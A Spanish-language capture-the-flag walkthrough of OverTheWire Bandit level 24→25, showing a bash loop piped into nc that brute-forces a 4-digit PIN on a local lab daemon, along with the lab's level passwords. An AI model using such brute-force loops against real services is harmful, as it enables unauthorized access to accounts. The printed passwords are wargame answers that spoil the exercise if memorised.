
# Level 24 a 25

## Objetivo
```
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
```
	
## Datos de acceso
	usuario: bandit24
	contraseña: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
## Solución
``` Shell 
	bandit24@bandit:~$ nc localhost 30002
	I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
	VAfGXJ1PBSsPSnvsjI8p759leLZ9GGarTimeout. Exiting.
	VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 9999
	bandit24@bandit:~$ echo {0000..0005]
	{0000..0005]
	bandit24@bandit:~$ echo {0000..0005}
	0000 0001 0002 0003 0004 0005
	
	bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong!
	I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
	Correct!
	The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
	
	Exiting.
	bandit24@bandit:~$

```

## Notas adicionales
	Creamos un for para encontrar la contraseña
## Referencias 